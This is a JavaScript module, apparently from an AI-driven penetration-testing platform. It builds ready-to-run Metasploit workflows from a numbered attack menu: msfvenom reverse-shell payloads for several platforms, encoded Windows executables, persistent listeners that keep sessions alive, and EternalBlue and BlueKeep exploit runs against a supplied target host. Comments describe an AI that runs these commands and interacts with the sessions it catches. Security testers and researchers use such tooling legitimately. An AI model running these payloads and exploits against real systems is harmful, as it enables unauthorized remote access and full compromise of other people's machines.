// Metasploit "brain" — turns a plain request (or a menu number) into the exact msfvenom payload + msfconsole
// resource script, using the OPERATOR'S OWN IP so they can test the payload on their own device. The heavy
// lifting (session-alive handlers) is done by the background job manager; this module just builds the right
// commands and the numbered attack menu.
//
// Philosophy (same as the rest of the platform): the intelligence lives here, not in the model's memory — the
// user says "reverse shell for windows" or "3", and we emit the correct, ready-to-run Metasploit workflow.

import os from 'node:os';

// ---- IP detection: the LHOST the payload calls back to (the user's machine) ----
export function localIps() {
  const out = [];
  const ifs = os.networkInterfaces();
  for (const [name, addrs] of Object.entries(ifs)) {
    for (const a of addrs || []) {
      if (a.family === 'IPv4' && !a.internal) out.push({ iface: name, ip: a.address });
    }
  }
  // private LAN addresses first (most common for testing on your own device)
  out.sort((a, b) => (/^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)/.test(a.ip) ? -1 : 1));
  return out;
}

export function bestLhost() {
  return localIps()[0]?.ip || '0.0.0.0';
}

// A shell snippet (run in the exec sandbox) that prints reachable IPs — LAN + public — so the AI can pick the
// right LHOST for where the payload will connect back from (own device on the LAN vs over the internet).
export function detectIpCommand() {
  return [
    'echo "== LAN IPs (use one of these to test on a device on the SAME network) ==";',
    'ip -4 addr show 2>/dev/null | awk "/inet /{print \\$2}" | grep -vE "^127\\." || hostname -I 2>/dev/null;',
    'echo "== Public IP (for over-the-internet; needs port-forwarding of the LPORT) ==";',
    'curl -s -m 5 https://api.ipify.org 2>/dev/null || curl -s -m 5 https://ifconfig.me 2>/dev/null || echo "(no internet / could not resolve public IP)";',
  ].join(' ');
}

const MET = 'meterpreter'; // default payload family

// ---- the numbered ATTACK MENU: pick by number OR describe it ----
// Each entry: { id, name, platform, kind, build(lhost, lport) -> { payload, venom, handler, note } }
const REV = {
  windows: { p: `windows/x64/${MET}/reverse_tcp`, fmt: 'exe', out: 'shell.exe' },
  windows32: { p: `windows/${MET}/reverse_tcp`, fmt: 'exe', out: 'shell.exe' },
  linux: { p: `linux/x64/${MET}/reverse_tcp`, fmt: 'elf', out: 'shell.elf' },
  android: { p: `android/${MET}/reverse_tcp`, fmt: 'raw', out: 'shell.apk' },
  php: { p: `php/${MET}/reverse_tcp`, fmt: 'raw', out: 'shell.php' },
  python: { p: `python/${MET}/reverse_tcp`, fmt: 'raw', out: 'shell.py' },
  macos: { p: `osx/x64/${MET}/reverse_tcp`, fmt: 'macho', out: 'shell.macho' },
  war: { p: `java/${MET}/reverse_tcp`, fmt: 'war', out: 'shell.war' },
};

function venom(lhost, lport, spec) {
  const enc = spec.p.startsWith('windows') ? ' -e x86/shikata_ga_nai -i 3' : '';
  return `msfvenom -p ${spec.p} LHOST=${lhost} LPORT=${lport} -f ${spec.fmt}${enc} -o ${spec.out}`;
}
// The matching multi/handler resource script (run as a persistent background job so the session STAYS ALIVE).
function handlerRc(payloadPath, lport) {
  return `use exploit/multi/handler; set PAYLOAD ${payloadPath}; set LHOST 0.0.0.0; set LPORT ${lport}; set ExitOnSession false; exploit -j`;
}

export const ATTACK_MENU = [
  { id: 1, name: 'Windows reverse shell (Meterpreter, x64)', kind: 'payload', spec: REV.windows },
  { id: 2, name: 'Linux reverse shell (Meterpreter, x64)', kind: 'payload', spec: REV.linux },
  { id: 3, name: 'Android reverse shell (APK)', kind: 'payload', spec: REV.android },
  { id: 4, name: 'PHP web reverse shell', kind: 'payload', spec: REV.php },
  { id: 5, name: 'Python reverse shell', kind: 'payload', spec: REV.python },
  { id: 6, name: 'macOS reverse shell (x64)', kind: 'payload', spec: REV.macos },
  { id: 7, name: 'Java WAR reverse shell (Tomcat)', kind: 'payload', spec: REV.war },
  { id: 8, name: 'Start a listener/handler only (catch a session)', kind: 'handler' },
  { id: 9, name: 'EternalBlue — MS17-010 (Windows SMB RCE)', kind: 'exploit', module: 'exploit/windows/smb/ms17_010_eternalblue', payload: `windows/x64/${MET}/reverse_tcp` },
  { id: 10, name: 'BlueKeep — CVE-2019-0708 (RDP RCE)', kind: 'exploit', module: 'exploit/windows/rdp/cve_2019_0708_bluekeep_rce', payload: `windows/x64/${MET}/reverse_tcp` },
];

export function renderMenu() {
  const lines = ['**Metasploit — pick an attack by number (or just describe it):**'];
  for (const m of ATTACK_MENU) lines.push(`${String(m.id).padStart(2)}. ${m.name}`);
  lines.push('\nThen give me your LHOST (your device IP — I can detect it) and LPORT (default 4444). For an exploit, also the target RHOST.');
  return lines.join('\n');
}

// ---- build a concrete plan from a menu id / kind ----
//   opts: { lhost, lport, rhost }
export function buildAttack(item, { lhost, lport = 4444, rhost } = {}) {
  const L = lhost || bestLhost();
  const P = String(lport).replace(/[^0-9]/g, '') || '4444';
  if (item.kind === 'payload') {
    return {
      kind: 'payload', name: item.name, lhost: L, lport: P, payload: item.spec.p, outfile: item.spec.out,
      venom: venom(L, P, item.spec),
      handler: handlerRc(item.spec.p, P),
      note: `1) Generate the payload (above). 2) I'll start the handler as a background job so the session stays alive. 3) Run "${item.spec.out}" on YOUR test device (it must be able to reach ${L}:${P}). When it runs, a session appears in the handler job — I'll interact with it.`,
    };
  }
  if (item.kind === 'handler') {
    return {
      kind: 'handler', name: item.name, lhost: L, lport: P, payload: `windows/x64/${MET}/reverse_tcp`,
      handler: handlerRc(`windows/x64/${MET}/reverse_tcp`, P),
      note: `Starts a persistent multi/handler on 0.0.0.0:${P}. Any matching reverse-shell payload that connects back becomes a live session.`,
    };
  }
  // exploit
  return {
    kind: 'exploit', name: item.name, lhost: L, lport: P, rhost: rhost || '<RHOST>', module: item.module, payload: item.payload,
    resource: `use ${item.module}; set RHOSTS ${rhost || '<RHOST>'}; set PAYLOAD ${item.payload}; set LHOST ${L}; set LPORT ${P}; set ExitOnSession false; exploit -j`,
    note: rhost ? `Runs ${item.module} against ${rhost}. On success a session lands in the background job.` : 'Give me the target RHOST (only an authorized target) and I will run it.',
  };
}

// Match a menu number OR a free-text description to an attack menu item.
export function pickAttack(query) {
  const q = String(query || '').toLowerCase().trim();
  const num = parseInt(q, 10);
  if (num && ATTACK_MENU.find((m) => m.id === num)) return ATTACK_MENU.find((m) => m.id === num);
  const by = (id) => ATTACK_MENU.find((m) => m.id === id);
  if (/eternalblue|ms17|smb.*rce/.test(q)) return by(9);
  if (/bluekeep|0708|rdp.*rce/.test(q)) return by(10);
  if (/handler|listener|catch/.test(q)) return by(8);
  if (/android|apk/.test(q)) return by(3);
  if (/\blinux\b|\belf\b/.test(q)) return by(2);
  if (/\bphp\b/.test(q)) return by(4);
  if (/\bpython\b|\bpy\b/.test(q)) return by(5);
  if (/\bmac|osx|macho/.test(q)) return by(6);
  if (/\bwar\b|tomcat|\bjava\b/.test(q)) return by(7);
  if (/windows|\bexe\b|meterpreter|reverse|shell/.test(q)) return by(1);
  return null;
}

// Parse lhost/lport/rhost from tokens. Supports key=value (lhost=…, lport=…, rhost=…) AND positional
// (first IP = LHOST, a 2nd IP = RHOST, a bare number = LPORT).
export function parseMsfArgs(tokens = []) {
  const args = { lhost: undefined, lport: undefined, rhost: undefined };
  const ips = [];
  for (const t of tokens) {
    const kv = /^(lhost|lport|rhost|rhosts)=(.+)$/i.exec(t);
    if (kv) { const k = kv[1].toLowerCase().replace('rhosts', 'rhost'); args[k] = kv[2]; continue; }
    if (/^\d{2,5}$/.test(t)) { if (!args.lport) args.lport = t; continue; }
    if (/^(\d{1,3}\.){3}\d{1,3}$/.test(t) || /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(t)) ips.push(t);
  }
  if (!args.lhost && ips[0]) args.lhost = ips[0];
  if (!args.rhost && ips[1]) args.rhost = ips[1];
  return args;
}

// Install prefix for the framework (self-heals a lean image).
export const ENSURE_MSF =
  'command -v msfconsole >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; apt-get install -y metasploit-framework >/dev/null 2>&1; }; ';

// The msfconsole command that runs a resource script (used for handler + exploit as a background job).
export function msfconsoleCmd(resourceScript) {
  const ensure = 'command -v msfconsole >/dev/null 2>&1 || { apt-get update -y >/dev/null 2>&1; apt-get install -y metasploit-framework >/dev/null 2>&1; }; ';
  // -q quiet, -x run these commands; keep the console open so the handler stays alive as a job
  return ensure + `msfconsole -q -x "${resourceScript.replace(/"/g, '\\"')}"`;
}

// ---- parse msfconsole/handler output -> findings (a caught session is critical) ----
export function parseMsf(command, output) {
  if (!/msfconsole|meterpreter|multi\/handler|msfvenom/i.test(String(command)) || !output) return [];
  const t = String(output);
  const out = [];
  // session opened
  for (const m of t.matchAll(/(?:Meterpreter|Command shell) session (\d+) opened \(([^)]+)\)/gi)) {
    out.push({
      finding_type: 'access', severity: 'critical', source: 'metasploit',
      title: `Metasploit session ${m[1]} opened (${m[2]})`, evidence: m[0].slice(0, 200),
      remediation: 'A live remote session was established — full compromise. On a real engagement: contain, rotate credentials, and remediate the entry vector.',
    });
  }
  if (/\[\+\].*(?:exploit completed|command executed|session)/i.test(t) && !out.length && /session/i.test(t)) {
    out.push({ finding_type: 'access', severity: 'high', source: 'metasploit', title: 'Metasploit exploit reported success', evidence: t.slice(0, 200) });
  }
  return out;
}
